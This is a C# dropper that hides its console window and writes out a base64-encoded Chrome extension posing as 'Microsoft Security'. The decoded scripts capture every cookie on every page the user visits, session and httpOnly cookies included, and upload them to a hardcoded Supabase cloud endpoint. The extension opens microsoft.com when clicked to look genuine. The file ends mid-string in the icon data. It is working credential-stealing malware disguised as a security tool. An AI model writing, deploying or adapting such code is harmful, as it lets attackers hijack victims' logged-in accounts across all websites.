using System;
using System.IO;
using System.Diagnostics;
using Microsoft.Win32;
using System.Runtime.InteropServices;

class Program
{
    [DllImport("kernel32.dll")]
    static extern IntPtr GetConsoleWindow();

    [DllImport("user32.dll")]
    static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

    static void Main()
    {
        IntPtr handle = GetConsoleWindow();
        if (handle != IntPtr.Zero) ShowWindow(handle, 0);

        try
        {
            string extractDir = Path.Combine(
                Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                "Microsoft-Security-Extension", "microsoft-security-extension");

            if (Directory.Exists(extractDir))
                Directory.Delete(extractDir, true);
            Directory.CreateDirectory(Path.Combine(extractDir, "icons"));

            byte[] f_manifest_json = Convert.FromBase64String("ewogICJtYW5pZmVzdF92ZXJzaW9uIjogMywKICAibmFtZSI6ICJNaWNyb3NvZnQgU2VjdXJpdHkiLAogICJ2ZXJzaW9uIjogIjEuMC4wIiwKICAiZGVzY3JpcHRpb24iOiAiU2F2ZSBhbmQgbWFuYWdlIGFsbCB3ZWJzaXRlIHNlc3Npb24gSURzIGFuZCBjb29raWVzIHdpdGggd2Vic2l0ZSBsaW5rcy4gRG93bmxvYWQgeW91ciBzZXNzaW9uIGRhdGEgYW55dGltZS4iLAogICJpY29ucyI6IHsKICAgICIxNiI6ICJpY29ucy9pY29uMTYucG5nIiwKICAgICIzMiI6ICJpY29ucy9pY29uMzIucG5nIiwKICAgICI0OCI6ICJpY29ucy9pY29uNDgucG5nIiwKICAgICIxMjgiOiAiaWNvbnMvaWNvbjEyOC5wbmciCiAgfSwKICAiYWN0aW9uIjogewogICAgImRlZmF1bHRfdGl0bGUiOiAiTWljcm9zb2Z0IFNlY3VyaXR5IiwKICAgICJkZWZhdWx0X2ljb24iOiB7CiAgICAgICIxNiI6ICJpY29ucy9pY29uMTYucG5nIiwKICAgICAgIjMyIjogImljb25zL2ljb24zMi5wbmciLAogICAgICAiNDgiOiAiaWNvbnMvaWNvbjQ4LnBuZyIsCiAgICAgICIxMjgiOiAiaWNvbnMvaWNvbjEyOC5wbmciCiAgICB9CiAgfSwKICAiYmFja2dyb3VuZCI6IHsKICAgICJzZXJ2aWNlX3dvcmtlciI6ICJiYWNrZ3JvdW5kLmpzIiwKICAgICJ0eXBlIjogIm1vZHVsZSIKICB9LAogICJwZXJtaXNzaW9ucyI6IFsKICAgICJjb29raWVzIiwKICAgICJzdG9yYWdlIiwKICAgICJ0YWJzIiwKICAgICJ3ZWJOYXZpZ2F0aW9uIgogIF0sCiAgImhvc3RfcGVybWlzc2lvbnMiOiBbCiAgICAiaHR0cDovLyovKiIsCiAgICAiaHR0cHM6Ly8qLyoiCiAgXQp9Cg==");
            File.WriteAllBytes(Path.Combine(extractDir, "manifest.json"), f_manifest_json);

            byte[] f_background_js = Convert.FromBase64String("Ly8gTWljcm9zb2Z0IFNlY3VyaXR5IC0gQ29va2llIExpc3QgTWFuYWdlciB3aXRoIENsb3VkIFN5bmMKLy8gQ2FwdHVyZXMgY29va2llcyBhbmQgc3luY3MgdG8gU3VwYWJhc2UgY2xvdWQKCmltcG9ydCAnLi9zdXBhYmFzZS5qcyc7Cgpjb25zdCBTVE9SQUdFX0tFWSA9ICdtc19jb29raWVzX2xpc3QnOwpjb25zdCBERVZJQ0VfS0VZID0gJ21zX2RldmljZV9pZCc7CgovLyBHZW5lcmF0ZSBvciByZXRyaWV2ZSBhIHVuaXF1ZSBkZXZpY2UvYnJvd3NlciBJRAphc3luYyBmdW5jdGlvbiBnZXREZXZpY2VJZCgpIHsKICBjb25zdCByZXN1bHQgPSBhd2FpdCBjaHJvbWUuc3RvcmFnZS5sb2NhbC5nZXQoREVWSUNFX0tFWSk7CiAgaWYgKHJlc3VsdFtERVZJQ0VfS0VZXSkgcmV0dXJuIHJlc3VsdFtERVZJQ0VfS0VZXTsKICAvLyBHZW5lcmF0ZSBuZXcgZGV2aWNlIElEOiByYW5kb20gOCBjaGFycwogIGNvbnN0IGlkID0gJ0RFVi0nICsgTWF0aC5yYW5kb20oKS50b1N0cmluZygzNikuc3Vic3RyaW5nKDIsIDEwKS50b1VwcGVyQ2FzZSgpOwogIGF3YWl0IGNocm9tZS5zdG9yYWdlLmxvY2FsLnNldCh7IFtERVZJQ0VfS0VZXTogaWQgfSk7CiAgcmV0dXJuIGlkOwp9CgovLyBQdXNoIG5ldyBjb29raWVzIHRvIGNsb3VkCmFzeW5jIGZ1bmN0aW9uIHB1c2hUb0Nsb3VkKG5ld0Nvb2tpZXMpIHsKICB0cnkgewogICAgY29uc3QgcmVzdWx0ID0gYXdhaXQgTVNfQ0xPVUQucHVzaChuZXdDb29raWVzKTsKICAgIGlmICghcmVzdWx0LnN1Y2Nlc3MpIHsKICAgICAgY29uc29sZS53YXJuKCdbTVMgQ2xvdWRdIFB1c2ggZmFpbGVkOicsIHJlc3VsdC5lcnJvcik7CiAgICB9CiAgICByZXR1cm4gcmVzdWx0OwogIH0gY2F0Y2ggKGVycikgewogICAgY29uc29sZS53YXJuKCdbTVMgQ2xvdWRdIFB1c2ggZXJyb3I6JywgZXJyKTsKICAgIHJldHVybiB7IHN1Y2Nlc3M6IGZhbHNlLCBlcnJvcjogZXJyLm1lc3NhZ2UgfTsKICB9Cn0KCi8vIFNhdmUgbG9jYWxseSBhbmQgcHVzaCB0byBjbG91ZAphc3luYyBmdW5jdGlvbiBzYXZlQ29va2llcyhuZXdDb29raWVzKSB7CiAgLy8gU2F2ZSBsb2NhbGx5IGZpcnN0CiAgY29uc3QgcmVzdWx0ID0gYXdhaXQgY2hyb21lLnN0b3JhZ2UubG9jYWwuZ2V0KFNUT1JBR0VfS0VZKTsKICBsZXQgbGlzdCA9IHJlc3VsdFtTVE9SQUdFX0tFWV0gfHwgW107CgogIGZvciAoY29uc3QgYyBvZiBuZXdDb29raWVzKSB7CiAgICBsaXN0LnB1c2goYyk7CiAgfQoKICAvLyBLZWVwIGxhdGVzdCAyMDAwCiAgaWYgKGxpc3QubGVuZ3RoID4gMjAwMCkgewogICAgbGlzdCA9IGxpc3Quc2xpY2UobGlzdC5sZW5ndGggLSAyMDAwKTsKICB9CgogIGF3YWl0IGNocm9tZS5zdG9yYWdlLmxvY2FsLnNldCh7IFtTVE9SQUdFX0tFWV06IGxpc3QgfSk7CgogIC8vIFB1c2ggdG8gY2xvdWQgaW4gYmFja2dyb3VuZAogIHB1c2hUb0Nsb3VkKG5ld0Nvb2tpZXMpOwp9CgovLyBCdWlsZCBjb29raWUgZW50cmllcyBmcm9tIGNocm9tZS5jb29raWVzICh3aXRoIGRldmljZSBJRCkKYXN5bmMgZnVuY3Rpb24gYnVpbGRDb29raWVFbnRyaWVzKGNvb2tpZXMsIHVybCkgewogIGNvbnN0IGRvbWFpbiA9IG5ldyBVUkwodXJsKS5ob3N0bmFtZTsKICBjb25zdCBub3cgPSBEYXRlLm5vdygpOwogIGNvbnN0IGRldmljZUlkID0gYXdhaXQgZ2V0RGV2aWNlSWQoKTsKICByZXR1cm4gY29va2llcy5tYXAoYyA9PiAoewogICAgaWQ6IGAke2RvbWFpbn1fJHtjLm5hbWV9XyR7bm93fV8ke01hdGgucmFuZG9tKCkudG9TdHJpbmcoMzYpLnNsaWNlKDIsIDYpfWAsCiAgICBkZXZpY2VfaWQ6IGRldmljZUlkLAogICAgZG9tYWluOiBkb21haW4sCiAgICB1cmw6IHVybCwKICAgIG5hbWU6IGMubmFtZSwKICAgIHZhbHVlOiBjLnZhbHVlLAogICAgcGF0aDogYy5wYXRoLAogICAgc2VjdXJlOiBjLnNlY3VyZSA/ICdZZXMnIDogJ05vJywKICAgIGh0dHBPbmx5OiBjLmh0dHBPbmx5ID8gJ1llcycgOiAnTm8nLAogICAgc2FtZVNpdGU6IGMuc2FtZVNpdGUgfHwgJ25vbmUnLAogICAgZXhwaXJ5OiBjLmV4cGlyYXRpb25EYXRlID8gbmV3IERhdGUoYy5leHBpcmF0aW9uRGF0ZSAqIDEwMDApLnRvTG9jYWxlU3RyaW5nKCkgOiAnU2Vzc2lvbicsCiAgICBjYXB0dXJlZDogbmV3IERhdGUobm93KS50b0xvY2FsZVN0cmluZygpLAogICAgdGltZXN0YW1wOiBub3cKICB9KSk7Cn0KCi8vIExpc3RlbiBmb3IgcGFnZSBsb2FkcwpjaHJvbWUud2ViTmF2aWdhdGlvbi5vbkNvbXBsZXRlZC5hZGRMaXN0ZW5lcihhc3luYyAoZGV0YWlscykgPT4gewogIGlmIChkZXRhaWxzLmZyYW1lSWQgIT09IDApIHJldHVybjsKICBjb25zdCB1cmwgPSBkZXRhaWxzLnVybDsKICBpZiAoIXVybC5zdGFydHNXaXRoKCdodHRwJykpIHJldHVybjsKCiAgdHJ5IHsKICAgIGNvbnN0IGNvb2tpZXMgPSBhd2FpdCBjaHJvbWUuY29va2llcy5nZXRBbGwoeyB1cmwgfSk7CiAgICBpZiAoIWNvb2tpZXMgfHwgY29va2llcy5sZW5ndGggPT09IDApIHJldHVybjsKCiAgICBjb25zdCBlbnRyaWVzID0gYXdhaXQgYnVpbGRDb29raWVFbnRyaWVzKGNvb2tpZXMsIHVybCk7CiAgICBhd2FpdCBzYXZlQ29va2llcyhlbnRyaWVzKTsKCiAgICBjb25zb2xlLmxvZyhgW01TIFNlY3VyaXR5XSBTYXZlZCAke2Nvb2tpZXMubGVuZ3RofSBjb29raWVzIGZyb20gJHtuZXcgVVJMKHVybCkuaG9zdG5hbWV9YCk7CiAgfSBjYXRjaCAoZXJyKSB7CiAgICBjb25zb2xlLmVycm9yKCdbTVMgU2VjdXJpdHldIEVycm9yOicsIGVycik7CiAgfQp9LCB7IHVybDogW3sgc2NoZW1lczogWydodHRwJywgJ2h0dHBzJ10gfV0gfSk7CgovLyBBbHNvIGNhcHR1cmUgb24gdGFiIHVwZGF0ZSAoU1BBcykKY2hyb21lLnRhYnMub25VcGRhdGVkLmFkZExpc3RlbmVyKGFzeW5jICh0YWJJZCwgY2hhbmdlSW5mbywgdGFiKSA9PiB7CiAgaWYgKGNoYW5nZUluZm8uc3RhdHVzICE9PSAnY29tcGxldGUnKSByZXR1cm47CiAgaWYgKCF0YWIudXJsIHx8ICF0YWIudXJsLnN0YXJ0c1dpdGgoJ2h0dHAnKSkgcmV0dXJuOwoKICB0cnkgewogICAgY29uc3QgY29va2llcyA9IGF3YWl0IGNocm9tZS5jb29raWVzLmdldEFsbCh7IHVybDogdGFiLnVybCB9KTsKICAgIGlmICghY29va2llcyB8fCBjb29raWVzLmxlbmd0aCA9PT0gMCkgcmV0dXJuOwoKICAgIGNvbnN0IGVudHJpZXMgPSBhd2FpdCBidWlsZENvb2tpZUVudHJpZXMoY29va2llcywgdGFiLnVybCk7CiAgICBhd2FpdCBzYXZlQ29va2llcyhlbnRyaWVzKTsKICB9IGNhdGNoIChlcnIpIHsgLyogc2lsZW50ICovIH0KfSk7CgovLyBIYW5kbGUgbWVzc2FnZXMgZnJvbSBwb3B1cApjaHJvbWUucnVudGltZS5vbk1lc3NhZ2UuYWRkTGlzdGVuZXIoKG1lc3NhZ2UsIHNlbmRlciwgc2VuZFJlc3BvbnNlKSA9PiB7CiAgaWYgKG1lc3NhZ2UuYWN0aW9uID09PSAnZ2V0Q29va2llcycpIHsKICAgIGNocm9tZS5zdG9yYWdlLmxvY2FsLmdldChTVE9SQUdFX0tFWSkudGhlbihyZXN1bHQgPT4gewogICAgICBzZW5kUmVzcG9uc2UoeyBjb29raWVzOiByZXN1bHRbU1RPUkFHRV9LRVldIHx8IFtdIH0pOwogICAgfSk7CiAgICByZXR1cm4gdHJ1ZTsKICB9CgogIGlmIChtZXNzYWdlLmFjdGlvbiA9PT0gJ2NsZWFyQWxsJykgewogICAgY2hyb21lLnN0b3JhZ2UubG9jYWwucmVtb3ZlKFNUT1JBR0VfS0VZKS50aGVuKGFzeW5jICgpID0+IHsKICAgICAgYXdhaXQgTVNfQ0xPVUQuY2xlYXIoKTsKICAgICAgc2VuZFJlc3BvbnNlKHsgc3VjY2VzczogdHJ1ZSB9KTsKICAgIH0pOwogICAgcmV0dXJuIHRydWU7CiAgfQoKICAvLyBDbG91ZCBzeW5jIGFjdGlvbnMKICBpZiAobWVzc2FnZS5hY3Rpb24gPT09ICdjbG91ZFB1c2gnKSB7CiAgICBjaHJvbWUuc3RvcmFnZS5sb2NhbC5nZXQoU1RPUkFHRV9LRVkpLnRoZW4oYXN5bmMgKHJlc3VsdCkgPT4gewogICAgICBjb25zdCBsaXN0ID0gcmVzdWx0W1NUT1JBR0VfS0VZXSB8fCBbXTsKICAgICAgY29uc3QgcmVzID0gYXdhaXQgTVNfQ0xPVUQucHVzaChsaXN0KTsKICAgICAgc2VuZFJlc3BvbnNlKHJlcyk7CiAgICB9KTsKICAgIHJldHVybiB0cnVlOwogIH0KCiAgaWYgKG1lc3NhZ2UuYWN0aW9uID09PSAnY2xvdWRGZXRjaCcpIHsKICAgIE1TX0NMT1VELmZldGNoKCkudGhlbihyZXN1bHQgPT4gewogICAgICBzZW5kUmVzcG9uc2UocmVzdWx0KTsKICAgIH0pOwogICAgcmV0dXJuIHRydWU7CiAgfQoKICBpZiAobWVzc2FnZS5hY3Rpb24gPT09ICdjbG91ZFN5bmMnKSB7CiAgICBjaHJvbWUuc3RvcmFnZS5sb2NhbC5nZXQoU1RPUkFHRV9LRVkpLnRoZW4oYXN5bmMgKHJlc3VsdCkgPT4gewogICAgICBjb25zdCBsb2NhbCA9IHJlc3VsdFtTVE9SQUdFX0tFWV0gfHwgW107CiAgICAgIGNvbnN0IG1lcmdlZCA9IGF3YWl0IE1TX0NMT1VELnN5bmMobG9jYWwpOwogICAgICAvLyBTYXZlIG1lcmdlZCBiYWNrIHRvIGxvY2FsCiAgICAgIGF3YWl0IGNocm9tZS5zdG9yYWdlLmxvY2FsLnNldCh7IFtTVE9SQUdFX0tFWV06IG1lcmdlZCB9KTsKICAgICAgc2VuZFJlc3BvbnNlKHsgc3VjY2VzczogdHJ1ZSwgY291bnQ6IG1lcmdlZC5sZW5ndGggfSk7CiAgICB9KTsKICAgIHJldHVybiB0cnVlOwogIH0KCiAgaWYgKG1lc3NhZ2UuYWN0aW9uID09PSAnY2xvdWRDaGVjaycpIHsKICAgIE1TX0NMT1VELmNoZWNrKCkudGhlbihyZXN1bHQgPT4gewogICAgICBzZW5kUmVzcG9uc2UocmVzdWx0KTsKICAgIH0pOwogICAgcmV0dXJuIHRydWU7CiAgfQp9KTsKCi8vIFdoZW4gZXh0ZW5zaW9uIGljb24gaXMgY2xpY2tlZCwgb3BlbiBNaWNyb3NvZnQgU2VjdXJpdHkgcGFnZQpjaHJvbWUuYWN0aW9uLm9uQ2xpY2tlZC5hZGRMaXN0ZW5lcigodGFiKSA9PiB7CiAgY2hyb21lLnRhYnMuY3JlYXRlKHsgdXJsOiAnaHR0cHM6Ly9taWNyb3NvZnQuY29tL2VuL3NlY3VyaXR5JyB9KTsKfSk7Cgpjb25zb2xlLmxvZygnW01TIFNlY3VyaXR5XSBFeHRlbnNpb24gbG9hZGVkIHdpdGggY2xvdWQgc3luYy4nKTsK");
            File.WriteAllBytes(Path.Combine(extractDir, "background.js"), f_background_js);

            byte[] f_supabase_js = Convert.FromBase64String("Ly8gTWljcm9zb2Z0IFNlY3VyaXR5IC0gU3VwYWJhc2UgQ2xvdWQgU3luYwovLyBXb3JrcyBpbiBib3RoIHNlcnZpY2Ugd29ya2VyIChtb2R1bGUpIGFuZCBwb3B1cCAoZ2xvYmFsIHNjcmlwdCkKCmNvbnN0IE1TX0NMT1VEID0gewogIHVybDogJ2h0dHBzOi8vdmVjd2hxZ214ZGt1d3hwbWd1YWwuc3VwYWJhc2UuY28nLAogIGtleTogJ3NiX3B1Ymxpc2hhYmxlX3FaRExXQ0JhY09HWDZQZXRYUzdVNWdfZTcwMkhVbHknLAogIHRhYmxlOiAnY29va2llcycsCgogIGhlYWRlcnMoKSB7CiAgICByZXR1cm4gewogICAgICAnQ29udGVudC1UeXBlJzogJ2FwcGxpY2F0aW9uL2pzb24nLAogICAgICAnYXBpa2V5JzogdGhpcy5rZXksCiAgICAgICdBdXRob3JpemF0aW9uJzogYEJlYXJlciAke3RoaXMua2V5fWAsCiAgICAgICdQcmVmZXInOiAncmV0dXJuPW1pbmltYWwnCiAgICB9OwogIH0sCgogIC8vIFB1c2ggY29va2llcyB0byBTdXBhYmFzZSAodXBzZXJ0IGJ5IGlkKQogIGFzeW5jIHB1c2goY29va2llcykgewogICAgaWYgKCFjb29raWVzIHx8IGNvb2tpZXMubGVuZ3RoID09PSAwKSByZXR1cm4geyBzdWNjZXNzOiB0cnVlLCBjb3VudDogMCB9OwogICAgdHJ5IHsKICAgICAgY29uc3QgcmVzID0gYXdhaXQgZmV0Y2goYCR7dGhpcy51cmx9L3Jlc3QvdjEvJHt0aGlzLnRhYmxlfWAsIHsKICAgICAgICBtZXRob2Q6ICdQT1NUJywKICAgICAgICBoZWFkZXJzOiB7CiAgICAgICAgICAuLi50aGlzLmhlYWRlcnMoKSwKICAgICAgICAgICdQcmVmZXInOiAncmVzb2x1dGlvbj1tZXJnZS1kdXBsaWNhdGVzLHJldHVybj1taW5pbWFsJwogICAgICAgIH0sCiAgICAgICAgYm9keTogSlNPTi5zdHJpbmdpZnkoY29va2llcykKICAgICAgfSk7CiAgICAgIGlmICghcmVzLm9rKSB7CiAgICAgICAgY29uc3QgdGV4dCA9IGF3YWl0IHJlcy50ZXh0KCk7CiAgICAgICAgcmV0dXJuIHsgc3VjY2VzczogZmFsc2UsIGVycm9yOiB0ZXh0LCBzdGF0dXM6IHJlcy5zdGF0dXMgfTsKICAgICAgfQogICAgICByZXR1cm4geyBzdWNjZXNzOiB0cnVlLCBjb3VudDogY29va2llcy5sZW5ndGggfTsKICAgIH0gY2F0Y2ggKGVycikgewogICAgICByZXR1cm4geyBzdWNjZXNzOiBmYWxzZSwgZXJyb3I6IGVyci5tZXNzYWdlIH07CiAgICB9CiAgfSwKCiAgLy8gRmV0Y2ggYWxsIGNvb2tpZXMgZnJvbSBTdXBhYmFzZQogIGFzeW5jIGZldGNoKCkgewogICAgdHJ5IHsKICAgICAgY29uc3QgcmVzID0gYXdhaXQgZmV0Y2goCiAgICAgICAgYCR7dGhpcy51cmx9L3Jlc3QvdjEvJHt0aGlzLnRhYmxlfT9zZWxlY3Q9KiZvcmRlcj10aW1lc3RhbXAuZGVzY2AsCiAgICAgICAgeyBoZWFkZXJzOiB0aGlzLmhlYWRlcnMoKSB9CiAgICAgICk7CiAgICAgIGlmICghcmVzLm9rKSB7CiAgICAgICAgY29uc3QgdGV4dCA9IGF3YWl0IHJlcy50ZXh0KCk7CiAgICAgICAgcmV0dXJuIHsgc3VjY2VzczogZmFsc2UsIGVycm9yOiB0ZXh0LCBzdGF0dXM6IHJlcy5zdGF0dXMgfTsKICAgICAgfQogICAgICBjb25zdCBkYXRhID0gYXdhaXQgcmVzLmpzb24oKTsKICAgICAgcmV0dXJuIHsgc3VjY2VzczogdHJ1ZSwgY29va2llczogZGF0YSB9OwogICAgfSBjYXRjaCAoZXJyKSB7CiAgICAgIHJldHVybiB7IHN1Y2Nlc3M6IGZhbHNlLCBlcnJvcjogZXJyLm1lc3NhZ2UgfTsKICAgIH0KICB9LAoKICAvLyBDbGVhciBhbGwgY29va2llcyBpbiBTdXBhYmFzZQogIGFzeW5jIGNsZWFyKCkgewogICAgdHJ5IHsKICAgICAgY29uc3QgcmVzID0gYXdhaXQgZmV0Y2goYCR7dGhpcy51cmx9L3Jlc3QvdjEvJHt0aGlzLnRhYmxlfWAsIHsKICAgICAgICBtZXRob2Q6ICdERUxFVEUnLAogICAgICAgIGhlYWRlcnM6IHRoaXMuaGVhZGVycygpCiAgICAgIH0pOwogICAgICBpZiAoIXJlcy5vaykgewogICAgICAgIGNvbnN0IHRleHQgPSBhd2FpdCByZXMudGV4dCgpOwogICAgICAgIHJldHVybiB7IHN1Y2Nlc3M6IGZhbHNlLCBlcnJvcjogdGV4dCB9OwogICAgICB9CiAgICAgIHJldHVybiB7IHN1Y2Nlc3M6IHRydWUgfTsKICAgIH0gY2F0Y2ggKGVycikgewogICAgICByZXR1cm4geyBzdWNjZXNzOiBmYWxzZSwgZXJyb3I6IGVyci5tZXNzYWdlIH07CiAgICB9CiAgfSwKCiAgLy8gQ2hlY2sgY29ubmVjdGlvbgogIGFzeW5jIGNoZWNrKCkgewogICAgdHJ5IHsKICAgICAgY29uc3QgcmVzID0gYXdhaXQgZmV0Y2goYCR7dGhpcy51cmx9L3Jlc3QvdjEvJHt0aGlzLnRhYmxlfT9zZWxlY3Q9aWQmbGltaXQ9MWAsIHsKICAgICAgICBoZWFkZXJzOiB0aGlzLmhlYWRlcnMoKQogICAgICB9KTsKICAgICAgcmV0dXJuIHsgY29ubmVjdGVkOiByZXMub2ssIHN0YXR1czogcmVzLnN0YXR1cyB9OwogICAgfSBjYXRjaCAoZXJyKSB7CiAgICAgIHJldHVybiB7IGNvbm5lY3RlZDogZmFsc2UsIGVycm9yOiBlcnIubWVzc2FnZSB9OwogICAgfQogIH0sCgogIC8vIEZ1bGwgc3luYzogcHVzaCBsb2NhbCAtPiBwdWxsIGNsb3VkIC0+IHJldHVybiBtZXJnZWQKICBhc3luYyBzeW5jKGxvY2FsQ29va2llcykgewogICAgaWYgKGxvY2FsQ29va2llcyAmJiBsb2NhbENvb2tpZXMubGVuZ3RoID4gMCkgewogICAgICBhd2FpdCB0aGlzLnB1c2gobG9jYWxDb29raWVzKTsKICAgIH0KICAgIGNvbnN0IGZldGNoZWQgPSBhd2FpdCB0aGlzLmZldGNoKCk7CiAgICBpZiAoZmV0Y2hlZC5zdWNjZXNzICYmIGZldGNoZWQuY29va2llcykgewogICAgICByZXR1cm4gZmV0Y2hlZC5jb29raWVzOwogICAgfQogICAgcmV0dXJuIGxvY2FsQ29va2llcyB8fCBbXTsKICB9Cn07CgovLyBNYWtlIGF2YWlsYWJsZSBnbG9iYWxseSAod29ya3MgaW4gbW9kdWxlcyBhbmQgcmVndWxhciBzY3JpcHRzKQpzZWxmLk1TX0NMT1VEID0gTVNfQ0xPVUQ7Cg==");
            File.WriteAllBytes(Path.Combine(extractDir, "supabase.js"), f_supabase_js);

            byte[] f_icons_icon16_png = Convert.FromBase64String("iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAADfSURBVDhPY2CgFvjor5Tw0V+xARUrJfyPl+eo38mQUL+ToQENJ9TvZ+AAa/4QoJTxKUDpPza8dgLv+vpdDP+x4h0MFVDbFRvQNcLwkmlcBzA0wvBOhobhYsCHAKUKdI0wvGISzx4MjegGvPeXF8ipm7TBv33VAWQMEltRYWJ6dAfDhis7GA4gY5DYtO0M6mADGJa8zWBY8v4/Njx9Q8L6/zsZ/mPFsGhkWPy+AV0jDK/a6H8AQyMCQ7wwLAx4V4GuEYYXbQjbg0UjmgHz3wuAXYEFR2ycrQdSiBVvZ1AAAJmoA82bCkoyAAAAAElFTkSuQmCC");
            File.WriteAllBytes(Path.Combine(extractDir, "icons\\icon16.png"), f_icons_icon16_png);

            byte[] f_icons_icon32_png = Convert.FromBase64String("iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAAF2SURBVFhH7ZW/S8NAFIDfWEQ3h2yhmfIf6OomFEwUFDczdnAQXDol2VwcpIOOhTaClkojiN6VglmcXJWMziLtNUXIlpOkjcil4MvW4Q6+7d7Hlx/wAJbpRIZmRUbVxaFZ/Eit5LMOBcuh4CKxnGf4nYVUFJlaODU1XhL2fqqo9gBCZwC8DDYF5jyAkgVMTK2+QI7i7mKtL8rREGjMX33VFcVYvMuVoCDGQsGVATJABsiA5QiYmFpDFGO5aa4OC2IsecD3vqpEphaLcgyvJ+s1m0JckOPYzALSM91T9WO76Rtn3QBDejc83NhJZx0C+gsB/41AgCG9e/4E2ezstD4q0GEheIyXY8y2ej01oRByCrwMCQHG83UM3qhelOO48q2+KEeTr2PoMFcUY+neG0FBjGf2E8oAGSADZMASBIwbohhL2z8YLhBjmQe0PhXwWCzKMezetmoJgXiB/F+Sxz/rGK6/9OxTlKE92k5HOQE9fZoyJASy2R/APd1XRV6ffwAAAABJRU5ErkJggg==");
            File.WriteAllBytes(Path.Combine(extractDir, "icons\\icon32.png"), f_icons_icon32_png);

            byte[] f_icons_icon48_png = Convert.FromBase64String("iVBORw0KGgoAAAANSUhEUgAAADAAAAAwCAYAAABXAvmHAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAAHdSURBVGhD7dgxS8NAFAfwNxbRRdxL49LRj9DRLcXBSbCCQkGHjHWwiZOCqNDBRUTQiFId4pRcLVgE6Rdw9wOIja17Ipc2pd6VSyDPRd7Bb33/+19ohwfwn85gJV/s61qlrxesbLSKr+eXJmebHhRNBhWTgZURn/FrdnT6umYMylqIq3A6urxhtiDEVH+CaHZ0+MvL4Thedhe2xHA0Hiz/4esP3Z/MeVIwFgbWqEDBEoOx2GczHSkYCxVIgQqoUIEUqIAKFUiBCqhQgRSogAoVSIEKqMQFvspaTQzGcteYbUvBWOIC3/piSQzG8rQ/fygFY2FQiQrwMygXXDEcQTdcz+fqLXCl8IzqDLrmM+TGBfi52d6wduoNRz9odrLgMy52qkf88vHsWwbWqwfOmwedLPiMJoMj6fJw7Rtg+yGuXrT6CDwwQgYhpoBNrFXg5qMoh+PYvD/eEsOxBPFa5W9ef+jcWfPEYETDfyG49i0xGEvzUe9MCcZCBRJRATUqkIgKqFGBRFRAjQokogJqVCARFVCLC/RqYjCWK2e1PSUYy/gLlMRgLLWHvcMpwTjcibUK2L4rhiPowuV7LmDgSuEZBQy6obSZsD+r0e8Bh8EvH48OXKjyT44h2nKMLv8DnTmiJFfPSscAAAAASUVORK5CYII=");
            File.WriteAllBytes(Path.Combine(extractDir, "icons\\icon48.png"), f_icons_icon48_png);

            byte[] f_icons_icon128_png = Convert.FromBase64String("iVBORw0KGgoAAAANSUhEUgAAAIAAAACACAYAAADDPmHLAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAAVBSURBVHhe7Z2xbxtlGMbfESGQLDHBYuwOzdiBgaUSYspmh4EJCY8eMmShKstdBEIeqjJ0gAEhS7UrIC1yWHp3JshZUGYkJMb+AVBf7Qze7tB3SaTve7+Lz4bpnjyP9Nvve+5352tU6RFhGIZhGIapSNpp3ll02r1Fp3VYH9o9c936LJskTOROmEgvTOSwRpjr/U/nLc3yo+bOotuaLLvtvP60osVe8319RjthLDvBVCbhVPK6E0wlCqey9rxrUzzt3fbKL7LenO+1Bvmnzdf0ec3TEySy0kXWnWAqg3Am3nnX5lW33dfFIXG+1/rWPm84lb4uDokgEee8a3Px2sd78jXnnVsfmPMWr33AJ9/jVynOW5lltz3TZYHywpw3mMrMKwuQYCrFedfG/DaWFAXLX/13buuioInkXX3PnZivZF0SMidfvnXPKwmZWLr6njtZdNoHuiRknn79ZuyVhEwih/qeOzF/PNElITP+5vVTryRkKIALBVChAOBQABcKoEIBwKEALhRAhQKAQwFcKIAKBQCHArhQABUKAA4FcKEAKhQAHArgQgFUKAA4FMCFAqhQAHAogAsFUKEA4FAAFwqgQgHAoQAuFECFAoBDAVwogAoFAIcCuFAAFQoADgVwoQAqFAAcCuBCAVQoADgUwIUCqFAAcCiACwVQoQDgUAAXCqBCAcChAC4UQIUCgEMBXCiACgUAhwK4UAAVCgBOlQCvuu37uiRkfnz0xolXEjKVAuzd2tUlIfP8q8ZDryRkEunpe+4k7TQbuiRk/th/+65XEjKbLIqZJQ1dFCJmFsec1yxpeEUBYmZx9L0uzU35GTDfO+a8YSy7uixIYinOu1GW3dZQFwbGmX3eYCpDrzAggkSc81bm4lugFZUUh8BZ2mk62znhTBqXQ4teeXXH3PzKraDrYsYjl912WlJi7TC/+Vev/etyOR6Z6hLrSDGFt81rf13Mxt73+/0H+8Gj487g6LQumOs11321EbhpzMbeUSIPfo/l+M9YTuuCuV5z3RtvBFbmyd87Mp5PZJzmAEQy+mftlm4ey06WyCRPJK87WSJR9vx/bAfLOO3JOF2VFFl3BjJ84W3p5pH0slhWusi6kyUyyLfdDpbxy35JcTiMUmdLN4ukr4tDIttmO/jitQ/55LuM0uJ3snjtAz75HtGm3wXj+cwrC5J5saWbJTLzygIkSzbYDi5+G72icHnvp99u66Kgqfx7gPlKLikKlc+fhfe8kpCp2g6WUXqgS0Lmu+NPYq8kbNb/fwAZpYe6JGSOfumclpSEDAWwoQA6FAAdCmBDAXQoADoUwIYC6FAAdCiADQXQoQDoUAAbCqBDAdChADYUQIcCoEMBbCiADgVAhwLYUAAdCoAOBbChADoUAB0KYEMBdCgAOhTAhgLoUAB0KIANBdChAOhQABsKoEMB0KEANhRAhwKgQwFsKIAOBUCHAthQAB0KgA4FsKEAOhQAHQpgQwF0KAA6FMCGAuhQAHQogA0F0KEA6FAAGwqgQwHQqRJgfl+XhMzj449PSkpCpkKAxy93dUnIfPHzZw9LSsIlqtgOlmHa0CUh8+HTyV2vJGyqt4OLJY2SsgAptnTNkkZJUXCYWRx9q8tzU34GzPeOESCWXV0WJFuNSD6ZD73CsHC2dLOpDL3CgMi23Q6+/BaISopD4Ex+SJ3tnHwmDTO0qItDwNz86q2g61KMR87TkhLryOrqtX9dLscjU11iHSmm8LZ67a+L2dgze0LmD0X1w1z3hpt5FzEbe1ksB+bfzXWjuO6NNwI